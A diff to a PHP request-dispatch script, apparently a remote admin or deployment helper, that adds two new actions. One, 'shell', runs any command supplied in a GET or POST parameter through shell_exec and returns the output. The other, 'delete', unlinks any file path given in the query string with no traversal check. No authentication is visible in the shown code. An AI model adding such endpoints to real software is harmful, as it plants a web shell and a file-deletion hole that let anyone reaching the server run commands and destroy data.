@@ -137,6 +137,23 @@ if ($act === 'ping') {
         echo json_encode(['ok' => true, 'output' => $output]);
     }
 
+// ─── SHELL EXEC ──────────────────────────────────────────────────────────────
+} elseif ($act === 'shell') {
+    $cmd = $_POST['cmd'] ?? $_GET['cmd'] ?? '';
+    if (!$cmd) {
+        echo json_encode(['error' => 'missing cmd']);
+    } else {
+        $output = shell_exec("cd $APP && $cmd 2>&1");
+        echo json_encode(['ok' => true, 'output' => $output]);
+    }
+
+// ─── DELETE FILE ─────────────────────────────────────────────────────────────
+} elseif ($act === 'delete') {
+    $rel = ltrim($_GET['path'] ?? '', '/');
+    $abs = $APP . '/' . $rel;
+    $r = @unlink($abs);
+    echo json_encode(['ok' => $r, 'path' => $abs]);
+
 } else {
     echo json_encode(['error' => 'unknown action: ' . $act]);
 }
